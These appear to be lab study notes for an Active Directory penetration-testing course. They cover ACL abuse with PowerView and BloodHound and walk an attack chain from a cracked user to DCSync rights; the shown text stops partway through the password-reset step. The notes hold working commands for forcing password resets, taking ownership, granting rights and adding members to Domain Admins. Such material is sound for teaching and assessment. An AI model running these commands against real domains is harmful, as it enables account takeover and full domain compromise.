GenericAll is the most powerful ACE permission possible. It gives the holder complete full control over the target object. This is essentially the same as being the owner of the object. With GenericAll over a user you can do absolutely anything — reset their password, assign SPNs for Kerberoasting, modify any attribute, take ownership, change the ACL itself. With GenericAll over a group you can add or remove any member. With GenericAll over a computer object and if LAPS is deployed in the environment, you can read the LAPS managed local administrator password for that computer and use it to log in locally which can then be used for lateral movement across the network.

GenericAll Explained:

Over a USER:
→ Full control = do ANYTHING
→ Reset password (ForceChangePassword)
→ Assign SPN (targeted Kerberoasting)
→ Modify any attribute
→ Take ownership of the object
→ Change the ACL of the object

Over a GROUP:
→ Add yourself to the group
→ Remove other members (dangerous = causes alerts)
→ Rename the group
→ Modify group description

Over a COMPUTER with LAPS:
→ Read the LAPS managed local admin password
→ Use that password to login as local admin
→ Pivot to that machine
→ Dump credentials from memory

PowerView abuse:
# Over user - reset password
Set-DomainUserPassword -Identity targetuser -AccountPassword ...

# Over group - add member
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ouruser'

# Over computer - read LAPS password
Get-DomainComputer -Identity targetPC -Properties ms-mcs-admpwd
WriteOwner

WriteOwner gives you the ability to change the ownership of an object. In Windows, the owner of an object automatically gets certain implicit rights over that object including the ability to modify the DACL. So if you have WriteOwner over a high privilege account or group, you can change the owner of that object to yourself, and once you own it you can then modify its DACL to give yourself any permissions you want including Full Control. This is a two-step attack but it is very powerful because once you take ownership you can grant yourself whatever permissions you need.

WriteOwner Attack Chain:

Step 1: We have WriteOwner over Domain Admins group
Step 2: Change owner of Domain Admins to our user
        Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'ouruser'
Step 3: As new owner = grant ourselves GenericAll
        Add-DomainObjectACL -TargetIdentity 'Domain Admins' -PrincipalIdentity 'ouruser' -Rights All
Step 4: Now add ourselves to Domain Admins
        Add-DomainGroupMember -Identity 'Domain Admins' -Members 'ouruser'
Step 5: We are Domain Admin
WriteDACL

WriteDACL gives you the ability to modify the DACL of an object itself. This means you can add new ACE entries to the object's access control list, effectively giving yourself or any other account any permissions you want over that object. This is extremely powerful because it lets you grant yourself Full Control over any object whose DACL you can write to. Once you have WriteDACL you essentially have indirect full control because you can grant yourself full direct control through one extra step.

WriteDACL Attack:

We have WriteDACL over Domain Admins group
→ Add a new ACE giving ourselves GenericAll:
   Add-DomainObjectACL -TargetIdentity 'Domain Admins' -PrincipalIdentity 'ouruser' -Rights All
→ Now we have GenericAll = add ourselves to group
→ We are Domain Admin

WriteDACL = indirect full control
= One extra step to become full control
AddSelf

AddSelf is a simpler but still very useful ACE permission. It specifically grants a user the right to add themselves to a security group. Unlike GenericWrite over a group which lets you add anyone, AddSelf only lets you add your own account to that specific group. While more limited, it is still very exploitable because if you can add yourself to a privileged group you gain all the permissions of that group.

AddSelf Explained:

We have AddSelf over "Server Admins" group
→ We can add OURSELVES (and only ourselves) to that group
→ Cannot add other users
→ But ourselves = enough

Attack:
Add-DomainGroupMember -Identity 'Server Admins' -Members 'ouruser'
→ We join Server Admins
→ Inherit all their permissions
→ Might be local admin on all servers
6. ACL Attack Scenarios in Real Assessments
Scenario 1: Help Desk Account Compromise
Help desk user (jsmith) has:
→ ForceChangePassword over ALL domain users
→ This is normal for help desk = legitimate

We compromise jsmith via password spray
→ jsmith:Welcome1 = cracked
→ Now WE have ForceChangePassword over everyone
→ Reset Domain Admin password
→ Login as Domain Admin
→ Full domain compromise in 2 steps

Scenario 2: Exchange Installation ACLs
Company installed Exchange server years ago
Exchange automatically added ACLs during install:
→ Exchange Windows Permissions group gets WriteDACL
   over the entire domain object
→ This is a known Exchange vulnerability
→ If we compromise any Exchange admin account
→ We have WriteDACL over domain
→ Grant ourselves DCSync rights
→ Dump all password hashes from DC
→ Full domain compromise

Scenario 3: Nested Group Permissions
Junior IT admin (bsmith) is in Help Desk group
Help Desk group is in IT Operations group
IT Operations group has GenericAll over Servers OU
→ bsmith indirectly has GenericAll over all servers
→ Nobody realized this chain existed
→ We compromise bsmith via LLMNR poisoning
→ We own all servers through this ACL chain
7. Tools for ACL Enumeration and Abuse
BloodHound:
→ Best tool for VISUALIZING ACL attack paths
→ Shows paths like:
   ouruser → GenericAll → IT Admins → Domain Admins
→ Makes complex chains immediately obvious
→ Edges in BloodHound = ACE permissions
→ Use SharpHound/BloodHound.py to collect data
→ Look for edges: GenericAll, WriteDACL, 
   ForceChangePassword, GenericWrite, AddMember

PowerView:
→ Best tool for ENUMERATING and EXPLOITING ACLs
→ Commands:
   Get-DomainObjectACL  → enumerate ACLs
   Set-DomainUserPassword → abuse ForceChangePassword
   Add-DomainGroupMember  → abuse GenericAll/GenericWrite
   Set-DomainObject       → abuse GenericWrite
   Set-DomainObjectOwner  → abuse WriteOwner
   Add-DomainObjectACL    → abuse WriteDACL

Built-in Windows tools:
→ Get-ACL (PowerShell) = read ACLs
→ ADUC GUI = view ACLs visually
→ dsacls.exe = command line ACL viewer
8. Complete ACE Attack Summary Table
┌──────────────────┬──────────────────────────┬──────────────────────────────┐
│ ACE Permission   │ What It Does             │ How We Abuse It              │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ ForceChange      │ Reset user password      │ Reset DA password            │
│ Password         │ without knowing current  │ Login as DA                  │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ GenericWrite     │ Write any non-protected  │ Assign SPN = Kerberoast      │
│                  │ attribute on object      │ Add to group = escalate      │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ GenericAll       │ Full control of object   │ Everything above + more      │
│                  │                          │ Read LAPS passwords          │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ WriteOwner       │ Change object owner      │ Take ownership               │
│                  │                          │ Then grant yourself rights   │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ WriteDACL        │ Modify the ACL itself    │ Grant yourself GenericAll    │
│                  │                          │ Then do anything             │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ AddSelf          │ Add yourself to group    │ Join privileged group        │
│                  │                          │ Inherit group permissions    │
├──────────────────┼──────────────────────────┼──────────────────────────────┤
│ AllExtendedRights│ All extended permissions │ Reset password               │
│                  │                          │ Add group members            │
└──────────────────┴──────────────────────────┴──────────────────────────────┘
9. Key Things to Remember
1. Every AD object has an ACL
   Users, groups, computers, GPOs, OUs
   Every single one has its own permission list

2. DACL = who can access (the important one for attacks)
   SACL = who gets logged (watch out for this)

3. Each ACE has 4 parts:
   WHO (SID) + TYPE (allow/deny/audit) +
   INHERITANCE + WHAT (access mask)

4. ACL misconfigs are invisible to vulnerability scanners
   Only BloodHound and manual review find them
   Often exist for years undetected

5. GenericAll = most powerful = full control
   WriteDACL = can make yourself GenericAll
   WriteOwner = can make yourself WriteDACL
   = All three lead to full control eventually

6. ForceChangePassword = noisy = consult client first
   Changes password = legitimate user locked out
   = They will notice and call IT

7. GenericWrite = stealthiest attack
   Assign SPN = Kerberoast = offline cracking
   = No direct changes to sensitive attributes
   = Harder to detect

8. BloodHound shows attack PATHS
   Not just individual permissions
   Shows chains: userA → GenericAll → groupB → Domain Admins

9. AddSelf and GenericWrite over groups
   = lateral movement within the domain
   = Often overlooked because seems low privilege

10. Always clean up after ACL attacks
    Remove added group memberships
    Revert password changes
    Remove added SPNs
    Document everything you changed
    Report all findings to client

ACL Enumeration - Complete Detailed Notes
1. The Big Picture - Where Did These Users Come From?

This is the most important thing to understand before anything else. Let me explain the complete story of how all these users connect together because this confused you.

WHERE DID THESE USERS COME FROM?

wley:
→ We captured wley's NTLMv2 hash using Responder
→ (LLMNR/NBT-NS Poisoning section earlier in module)
→ We cracked it with hashcat
→ Password: transporter@4
→ THIS is our starting point = we OWN wley

damundsen:
→ We did NOT have this user before
→ We DISCOVERED it through ACL enumeration
→ We found wley has ForceChangePassword OVER damundsen
→ Meaning wley can reset damundsen's password
→ damundsen is our NEXT TARGET

adunn:
→ We did NOT have this user before either
→ We discovered it through further ACL enumeration
→ Information Technology group has GenericAll OVER adunn
→ adunn has DCSync rights over the domain
→ adunn is our FINAL TARGET = leads to Domain Compromise

The Chain We Are Building:
wley → (ForceChangePassword) → damundsen
damundsen → (GenericWrite on Help Desk Level 1 group)
Help Desk Level 1 → (nested in) → Information Technology group
Information Technology → (GenericAll) → adunn
adunn → (DCSync rights) → Full Domain Compromise
2. The Complete Attack Chain Visualized
START: We own wley (from Responder + hashcat)
                ↓
STEP 1: Enumerate what wley can do
         wley has ForceChangePassword over damundsen
                ↓
STEP 2: Reset damundsen's password
         We now control damundsen too
                ↓
STEP 3: Enumerate what damundsen can do
         damundsen has GenericWrite over Help Desk Level 1 group
                ↓
STEP 4: Add damundsen to Help Desk Level 1 group
         damundsen (and us) now in Help Desk Level 1
                ↓
STEP 5: Help Desk Level 1 is nested in IT group
         We automatically inherit IT group rights
                ↓
STEP 6: IT group has GenericAll over adunn
         We can do anything to adunn
                ↓
STEP 7: adunn has DCSync rights over domain
         adunn can dump ALL password hashes from DC
                ↓
END: Full Domain Compromise
3. Method 1 - PowerView Enumeration (Targeted Approach)
Why NOT Use Find-InterestingDomainAcl

Before showing you the right way, let me explain why the obvious command is actually the wrong starting point for practical use.

powershell
# This command exists but is impractical
Find-InterestingDomainAcl

Why this is bad:

A domain with 3000 users might have:
→ Hundreds of thousands of ACE entries
→ Takes 10-30 minutes to run
→ Returns pages and pages of output
→ Very hard to find what matters
→ Time-boxed assessment = you waste it all here

Better approach:
Start with a user YOU control
Ask "what can THIS user do?"
Follow the chain from there
Much faster and more focused
Task 1 - Convert Username to SID

Before we can search for ACL rights, we need the SID of our user. Active Directory stores permissions using SIDs internally not usernames so we must convert the username to a SID to search properly.

powershell
# Import PowerView first
Import-Module .\PowerView.ps1

# Convert wley username to SID
$sid = Convert-NameToSid wley

Breaking down:

Convert-NameToSid   → PowerView function
                      converts human readable name
                      to Security Identifier (SID)
wley                → the username we want to convert

$sid                → stores the result in a variable
                      we reuse this variable in next commands
                      SID looks like:
                      S-1-5-21-3842939050-3880317879-2865463114-1181
                                                                  ↑
                                                        unique number for wley

Why SID matters:

When AD stores ACL permissions it uses SIDs not names
Example in ACL:
SecurityIdentifier: S-1-5-21-...-1181   ← this is wley's SID
Not:
SecurityIdentifier: wley                 ← this is NOT how it is stored

So we search by SID = we find all ACEs belonging to wley
Task 2 - Find What wley Has Rights Over (Without GUID Resolution)
powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

Breaking down every part:

Get-DomainObjectACL         → PowerView function
                              retrieves ACL information
                              for objects in the domain

-Identity *                 → search ALL objects in domain
                              * = wildcard = everything
                              users, groups, computers, OUs
                              every object gets checked

|                           → pipe = pass output to next command

? {$_.SecurityIdentifier    → filter results
   -eq $sid}                → only show entries where
                              SecurityIdentifier EQUALS
                              our wley SID
                              = only show ACEs that belong to wley

What you find (without ResolveGUIDs):

ObjectDN      : CN=Dana Amundsen,OU=DevOps...
                ↑ THIS IS THE OBJECT wley HAS RIGHTS OVER
                = damundsen user account

ActiveDirectoryRights : ExtendedRight
                ↑ what TYPE of right = "Extended Right"
                = not very specific

ObjectAceType : 00299570-246d-11d0-a768-00aa006e0529
                ↑ THIS IS A GUID = not human readable
                = we dont know what this means yet
                = need to convert it

SecurityIdentifier: S-1-5-21-...-1181
                ↑ this is wley = confirms this ACE belongs to wley

The problem with this output:

ObjectAceType: 00299570-246d-11d0-a768-00aa006e0529
↑
This GUID tells us WHAT permission wley has over damundsen
But we cannot read it = it is a raw GUID number
We need to translate it to understand what we can do
Task 3 - Translate the GUID Manually (Learning Exercise)
powershell
# Store the GUID we found
$guid = "00299570-246d-11d0-a768-00aa006e0529"

# Look up what this GUID means in AD schema
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

Breaking down:

Get-ADObject            → built-in PowerShell AD command
                          gets any AD object

-SearchBase "CN=Extended-Rights,..."
                        → WHERE to search
                          Extended-Rights container in AD
                          this is where AD stores all
                          the definitions of extended rights
                          including what each GUID means

-Filter {ObjectClass -like 'ControlAccessRight'}
                        → only get objects that are
                          Control Access Rights
                          = permission definitions

-Properties *           → get ALL properties of each object

Select Name,DisplayName,rightsGuid
                        → only show these columns

?{$_.rightsGuid -eq $guid}
                        → filter where rightsGuid matches
                          our GUID we are looking up

| fl                    → format-list = show full output

What you find:

Name              : User-Force-Change-Password
DisplayName       : Reset Password
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529

= The GUID 00299570... means "Reset Password"
= wley has the right to RESET damundsen's password
= Without knowing damundsen's current password
= This is ForceChangePassword ACE
Task 4 - Find Rights WITH GUID Resolution (The Right Way)

Instead of manually translating GUIDs we use the ResolveGUIDs flag which does it automatically.

powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

Breaking down:

-ResolveGUIDs       → AUTOMATICALLY translates all GUIDs
                      to human readable names
                      No need to manually look up GUIDs
                      ObjectAceType now shows:
                      "User-Force-Change-Password"
                      instead of
                      "00299570-246d-11d0-a768-00aa006e0529"

What you find now (human readable):

AceQualifier          : AccessAllowed
                        ↑ this ACE ALLOWS the action
                          (not denying it)

ObjectDN              : CN=Dana Amundsen,OU=DevOps...
                        ↑ THE OBJECT this ACE applies TO
                          = damundsen user account
                          = wley has rights OVER damundsen

ActiveDirectoryRights : ExtendedRight
                        ↑ category of the right

ObjectAceType         : User-Force-Change-Password
                        ↑ NOW WE CAN READ THIS
                          = ForceChangePassword
                          = wley can reset damundsen's password
                          = without knowing current password

SecurityIdentifier    : S-1-5-21-...-1181
                        ↑ this is wley's SID
                          = confirms this is wley's permission

IsInherited           : False
                        ↑ this was directly assigned
                          not inherited from parent object
                          = intentionally given to wley
Task 5 - Alternative Method Using Built-in Windows Commands

This method does not require PowerView at all which is useful when PowerView is blocked or unavailable.

powershell
# Step 1: Get all domain users and save to file
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

Breaking down:

Get-ADUser -Filter *            → get ALL users in domain
                                  built-in AD PowerShell command
                                  no external tools needed

Select-Object -ExpandProperty  → extract just the property value
SamAccountName                   not the whole object
                                  SamAccountName = the login name
                                  (wley, damundsen, adunn etc)

> ad_users.txt                  → save all usernames to text file
                                  one username per line
powershell
# Step 2: Check ACLs for each user against wley
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | 
    Select-Object Path -ExpandProperty Access | 
    Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}

Breaking down:

foreach($line in ...)           → loop through each line
                                  of the ad_users.txt file
                                  $line = current username

[System.IO.File]::ReadLines()   → .NET method to read file
                                  line by line efficiently

get-acl "AD:\$(Get-ADUser $line)"
                                → get-acl = get access control list
                                  "AD:\" = Active Directory provider
                                  $(Get-ADUser $line) = gets the
                                  full AD path for each user
                                  combines = get ACL for this user

Select-Object Path              → show the path (which user)
-ExpandProperty Access          → show the actual ACE entries
                                  Access property = all ACEs

Where-Object {$_.IdentityReference 
-match 'INLANEFREIGHT\\wley'}   → filter results
                                  only show ACEs where
                                  wley is the one with the right
                                  IdentityReference = WHO has the right

What you find:

Path              : ...CN=Dana Amundsen...
                    ↑ wley has rights over damundsen

ActiveDirectoryRights : ExtendedRight
ObjectType        : 00299570-246d-11d0-a768-00aa006e0529
                    ↑ still a GUID = need to translate
                      use the previous method to look it up
                      = User-Force-Change-Password

IdentityReference : INLANEFREIGHT\wley
                    ↑ confirms this is wley's permission
Task 6 - Enumerate What damundsen Can Do

Now we know wley can reset damundsen's password. After we reset it and gain control of damundsen, we need to find out what damundsen can do. Same process, different starting user.

powershell
# Get damundsen's SID
$sid2 = Convert-NameToSid damundsen

# Find what damundsen has rights over
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

What you find:

AceType               : AccessAllowed
                        ↑ this is an ALLOW ACE

ObjectDN              : CN=Help Desk Level 1,OU=Security Groups...
                        ↑ THE OBJECT damundsen has rights over
                          = Help Desk Level 1 GROUP
                          = not a user this time = a GROUP

ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
                        ↑ MULTIPLE rights here
                          ListChildren = see group members
                          ReadProperty = read group info
                          GenericWrite = WRITE to the group
                                         = add members
                                         = most important right

SecurityIdentifier    : S-1-5-21-...-1176
                        ↑ this is damundsen's SID
                          = damundsen has GenericWrite
                            over Help Desk Level 1 group

What GenericWrite over a group means:

GenericWrite on Help Desk Level 1 group:
→ damundsen can ADD any user to this group
→ damundsen can ADD THEMSELVES to this group
→ Any member of Help Desk Level 1 inherits
  whatever permissions that group has
→ = damundsen can make anyone (including us) 
    a member of Help Desk Level 1
Task 7 - Check If Help Desk Level 1 is Nested in Any Groups
powershell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

Breaking down:

Get-DomainGroup             → PowerView function
                              gets information about a group

-Identity "Help Desk Level 1"
                            → specifically get this group

| select memberof           → only show the memberof property
                              memberof = which groups THIS group
                              belongs to (nested in)

What you find:

memberof
--------
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

= Help Desk Level 1 IS NESTED INSIDE Information Technology group
= Anyone in Help Desk Level 1 automatically gets
  ALL permissions that Information Technology group has
= So if we add ourselves to Help Desk Level 1
  we ALSO inherit Information Technology group rights
Task 8 - Find What Information Technology Group Can Do
powershell
# Get IT group SID
$itgroupsid = Convert-NameToSid "Information Technology"

# Find what IT group has rights over
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

What you find:

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin...
                        ↑ IT group has rights over ADUNN
                          = Angela Dunn user account

ActiveDirectoryRights : GenericAll
                        ↑ FULL CONTROL over adunn
                          = can do literally anything to adunn
                          = reset password
                          = add SPN for Kerberoasting
                          = modify any attribute
                          = change their ACL

SecurityIdentifier    : S-1-5-21-...-4016
                        ↑ this is IT group's SID

What GenericAll over a user means:

IT group has GenericAll over adunn:
→ Reset adunn's password = instant account takeover
→ Assign SPN to adunn = targeted Kerberoasting
→ Modify any attribute = anything we want
→ Change adunn's ACL = give ourselves more rights

Since we will be IN the IT group (via Help Desk Level 1)
= WE have GenericAll over adunn
= We can take over adunn completely
Task 9 - Find What adunn Can Do
powershell
# Get adunn SID
$adunnsid = Convert-NameToSid adunn

# Find what adunn has rights over
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

What you find:

ObjectDN      : DC=INLANEFREIGHT,DC=LOCAL
                ↑ adunn has rights over THE DOMAIN ITSELF
                  not a user or group
                  the root domain object

ObjectAceType : DS-Replication-Get-Changes
ObjectAceType : DS-Replication-Get-Changes-In-Filtered-Set
                ↑ TWO DCSync related permissions
                  DS-Replication-Get-Changes = can replicate AD data
                  DS-Replication-Get-Changes-In-Filtered-Set =
                  can replicate protected/filtered AD data
                  TOGETHER = DCSync rights
                  = can request copy of ALL password hashes
                    from Domain Controller
                  = like being a DC asking another DC to sync
                  = dumps NTLM hash of EVERY user including DA

What DCSync rights mean:

adunn has DCSync rights over domain:
→ Can pretend to be a Domain Controller
→ Ask the real DC to "replicate" (share) all password hashes
→ DC gives all hashes freely = this is normal DC behavior
→ But we are not a real DC = we are attacking
→ Get hash of Administrator, krbtgt, every domain user
→ Use those hashes for Pass-the-Hash attacks
→ = FULL DOMAIN COMPROMISE
4. Method 2 - BloodHound (Visual Approach)
Why BloodHound is Better for This
PowerView approach:
→ Run 5+ commands
→ Manually piece together the chain
→ Easy to miss connections
→ Takes 30-60 minutes minimum
→ Must understand what each result means

BloodHound approach:
→ Upload collected data once
→ Click on wley node
→ Click "Outbound Control Rights"
→ See the ENTIRE chain visually in 30 seconds
→ Right click any connection = get attack instructions
→ Much harder to miss connections
Task 10 - View wley's Rights in BloodHound
Step 1: Open BloodHound GUI
Step 2: Search for wley in search bar
Step 3: Click on wley node
Step 4: Click "Node Info" tab on left
Step 5: Scroll down to "Outbound Control Rights"
Step 6: Click "1" next to "First Degree Object Control"

What you see:

wley ──ForceChangePassword──→ damundsen

= Visual representation of exactly what PowerView showed us
= wley has ForceChangePassword edge to damundsen
= One click to see this vs multiple commands
Task 11 - View Full Attack Path (Transitive Control)
Click "16" next to "Transitive Object Control"

What you see:

wley
  ↓ ForceChangePassword
damundsen
  ↓ GenericWrite (on group)
Help Desk Level 1
  ↓ MemberOf (nested)
Information Technology
  ↓ GenericAll
adunn
  ↓ DCSync (GetChanges + GetChangesAll)
INLANEFREIGHT.LOCAL (domain)

= Entire attack chain from wley to domain compromise
= Showed in seconds
= BloodHound automatically traces ALL nested memberships
= PowerView would take hours to trace this manually
Task 12 - Get Attack Instructions from BloodHound
Right click the line between wley and damundsen
Select "Help"

What you see:

The Help popup shows:
1. Detailed explanation of ForceChangePassword
2. Exact PowerView commands to abuse it:
   Set-DomainUserPassword -Identity damundsen...
3. Opsec considerations (how noisy is this)
4. External references for more reading

= BloodHound gives you complete attack instructions
= No need to research how to exploit each edge
= Everything you need in one popup
Task 13 - Confirm adunn's DCSync Rights
In BloodHound Analysis tab
Select: "Find Principals with DCSync Rights"

What you see:

adunn ──GetChanges──→ INLANEFREIGHT.LOCAL
adunn ──GetChangesAll──→ INLANEFREIGHT.LOCAL

= Confirms adunn has DCSync rights
= Both required permissions are present
= Ready to perform DCSync attack
5. Understanding Every ACE Type You Encountered
ACE TYPE 1: User-Force-Change-Password
GUID:       00299570-246d-11d0-a768-00aa006e0529
What:       Reset target user password without knowing current one
Who used:   wley OVER damundsen
Impact:     Instant account takeover of damundsen
Risk:       HIGH NOISE - user loses access = will notice

ACE TYPE 2: GenericWrite
GUID:       Shown as "GenericWrite" in resolved output
What:       Write any non-protected attribute on object
Who used:   damundsen OVER Help Desk Level 1 group
Impact:     Add anyone to Help Desk Level 1 group
Risk:       MEDIUM NOISE - group membership change logged

ACE TYPE 3: GenericAll
GUID:       Shown as "GenericAll" in resolved output
What:       Full control over the object
Who used:   IT group OVER adunn
Impact:     Can do anything to adunn
Risk:       DEPENDS on what action you choose

ACE TYPE 4: DS-Replication-Get-Changes
GUID:       1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
What:       Request replication of AD data from DC
Who used:   adunn OVER domain object
Impact:     Part of DCSync = dump domain hashes
Risk:       LOW NOISE until you actually run DCSync

ACE TYPE 5: DS-Replication-Get-Changes-In-Filtered-Set
GUID:       89e95b76-444d-4c62-991a-0facbeda640c
What:       Request replication of protected AD data
Who used:   adunn OVER domain object
Impact:     REQUIRED together with above for full DCSync
Risk:       LOW NOISE until you actually run DCSync
6. Complete Command Reference
powershell
# Setup
Import-Module .\PowerView.ps1

# Step 1: Get SID for any user
$sid = Convert-NameToSid USERNAME

# Step 2: Find what that user has rights over (unreadable GUIDs)
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Step 3: Same but with readable output (ALWAYS use this)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Step 4: Translate a GUID manually if needed
$guid = "PASTE-GUID-HERE"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

# Step 5: Check group nesting
Get-DomainGroup -Identity "GROUP NAME" | select memberof

# Step 6: Built-in method (no PowerView needed)
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
7. Key Things to Remember
1. Always start with a user YOU control
   Then ask "what can THIS user do?"
   Follow the chain = do not use Find-InterestingDomainAcl
   blindly = too much data = impractical

2. ALWAYS use -ResolveGUIDs flag
   Without it = unreadable GUIDs
   With it = human readable permission names
   No excuse not to use it

3. The three users appeared because:
   wley = we owned from Responder + hashcat
   damundsen = wley has ForceChangePassword over them
   adunn = IT group has GenericAll over them
   We found damundsen and adunn through enumeration

4. Nested groups multiply permissions
   Being in Group A that is in Group B
   = You have ALL of Group B's permissions too
   ALWAYS check memberof for any group you join

5. DCSync = ultimate goal
   DS-Replication-Get-Changes + Get-Changes-In-Filtered-Set
   BOTH required = then can dump all domain hashes
   = Game over for the domain

6. BloodHound shows this in 30 seconds
   PowerView shows this in 30-60 minutes
   Use BloodHound first = confirm with PowerView
   BloodHound right-click Help = attack instructions included

7. AceQualifier: AccessAllowed = good for us
   AceQualifier: AccessDenied = blocked
   Always check this field first in output

8. IsInherited: False = directly assigned = intentional
   IsInherited: True = came from parent object
   Both are exploitable but direct is more interesting

9. SecurityIdentifier in output = WHO has the right
   ObjectDN in output = WHAT OBJECT they have rights over
   ObjectAceType = WHAT they can do
   These three fields = everything you need to know

10. Document the chain as you go
    wley → damundsen → Help Desk L1 → IT group → adunn → domain
    Draw it out = easier to explain in report
    = Easier to execute the attack chain in order

ACL Abuse Tactics - Complete Detailed Notes
1. Wherere We Are and Where We Are Going

Before starting any commands it is critical to understand the complete picture of what we are doing and why. This entire section is about executing an attack chain we discovered through enumeration. Think of it like a treasure map where each step leads to the next clue until we reach the final prize which is full domain control.

WHAT WE HAVE:
wley:transporter@4
→ Got this from Responder (LLMNR poisoning)
→ Cracked the NTLMv2 hash with hashcat
→ This is a regular low privilege domain user
→ THIS is our starting weapon

WHAT WE DISCOVERED THROUGH ENUMERATION:
wley → ForceChangePassword → damundsen
damundsen → GenericWrite → Help Desk Level 1 group
Help Desk Level 1 → nested inside → Information Technology group
Information Technology → GenericAll → adunn
adunn → DCSync rights → entire domain

WHAT WE WANT TO ACHIEVE:
Full domain compromise = dump ALL password hashes
= become Domain Admin = own everything

HOW WE GET THERE (attack chain):
Step 1: Use wley to reset damundsen password
Step 2: Login as damundsen
Step 3: Use damundsen to add damundsen to Help Desk Level 1
Step 4: Inherit IT group rights through nesting
Step 5: Use IT group GenericAll to Kerberoast adunn
Step 6: Crack adunn hash = get adunn password
Step 7: Login as adunn = perform DCSync = game over
2. Understanding PSCredential Objects - The Key Concept

Before we start attacking, we need to understand one critical PowerShell concept. When we run commands as our current user (htb-student) but want to perform actions as a DIFFERENT user (wley, damundsen), we need to tell PowerShell to use those different credentials. We do this by creating a PSCredential object which is essentially a secure container that holds a username and password that we can pass to commands. Every step in this attack chain requires us to authenticate as the right user to perform the right action because the permissions we are abusing only work when exercised by the specific user who has them.

Why PSCredential is needed:

Without PSCredential:
You run Set-DomainUserPassword as htb-student
→ htb-student has no rights over damundsen
→ Access denied = attack fails

With PSCredential:
You run Set-DomainUserPassword -Credential $Cred (wley)
→ PowerView authenticates TO AD as wley
→ wley HAS ForceChangePassword over damundsen
→ Password reset succeeds = attack works

Think of it like:
PSCredential = a disguise
You are physically htb-student
But AD thinks you are wley
Because you showed wley's badge (credential object)
3. Attack Step 1 - Reset damundsen's Password Using wley
Task 1 - Create PSCredential Object for wley
powershell
# Store wley's password as a secure string
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force

# Create the credential object
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

Breaking down every part:

ConvertTo-SecureString          → converts plain text password
                                  into an encrypted secure string
                                  PowerShell requires passwords
                                  to be SecureString not plain text
                                  for security reasons

'transporter@4'                 → wley's actual password
                                  obtained from hashcat earlier

-AsPlainText                    → tells the command the input
                                  is plain text (not already secure)

-Force                          → required when using -AsPlainText
                                  acknowledges we know it is plain text

$SecPassword                    → stores the secure string result
                                  we use this in the next command

New-Object                      → creates a new .NET object

System.Management.Automation
.PSCredential                   → the specific class for credentials
                                  built into PowerShell

'INLANEFREIGHT\wley'           → the username in DOMAIN\user format
                                  ALWAYS include domain name here
                                  just 'wley' alone might not work

$SecPassword                    → the secure password we just made

$Cred                          → the final credential object
                                  contains both username + password
                                  ready to use with -Credential flag
Task 2 - Create New Password for damundsen
powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Breaking down:

'Pwn3d_by_ACLs!'               → the NEW password we are setting
                                  for damundsen
                                  WE choose this password
                                  damundsen does not know about it
                                  meets complexity requirements:
                                  uppercase + lowercase + number
                                  + symbol = passes AD policy

$damundsenPassword              → stores this as a secure string
                                  used in the next command
Task 3 - Actually Reset damundsen's Password
powershell
# Go to Tools directory first
cd C:\Tools\

# Import PowerView
Import-Module .\PowerView.ps1

# Reset the password
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

Breaking down:

Set-DomainUserPassword          → PowerView function
                                  changes a user's password in AD
                                  without needing old password
                                  = ForceChangePassword abuse

-Identity damundsen             → WHICH user to reset
                                  = target user = damundsen
                                  can use username, DN, or SID

-AccountPassword $damundsenPassword
                                → the NEW password to set
                                  = 'Pwn3d_by_ACLs!' as secure string

-Credential $Cred               → CRITICAL: authenticate AS wley
                                  wley is the one with the right
                                  to change damundsen's password
                                  without this = fails as htb-student

-Verbose                        → show detailed output
                                  tells us if it worked or failed
                                  ALWAYS use this for troubleshooting

What you see when successful:

VERBOSE: [Get-PrincipalContext] Using alternate credentials
→ Confirmed using wley's credentials not current user

